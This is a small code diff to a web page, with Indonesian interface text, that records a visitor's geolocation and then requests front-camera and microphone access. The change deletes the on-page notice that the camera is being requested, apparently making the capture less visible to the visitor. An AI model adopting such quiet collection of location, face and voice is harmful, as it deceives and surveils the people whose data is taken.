@@ -165,7 +165,7 @@
         timestamp: new Date(position.timestamp).toISOString()
       };
 
-      status.textContent = `Lokasi terkunci (±${location.accuracy.toFixed(1)} m) → Meminta kamera...`;
+      status.textContent = `Lokasi terkunci (±${location.accuracy.toFixed(1)} m)`;
 
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user' }, audio: true
@@ -233,5 +233,6 @@
 
 </body>
 </html>
+
 
 
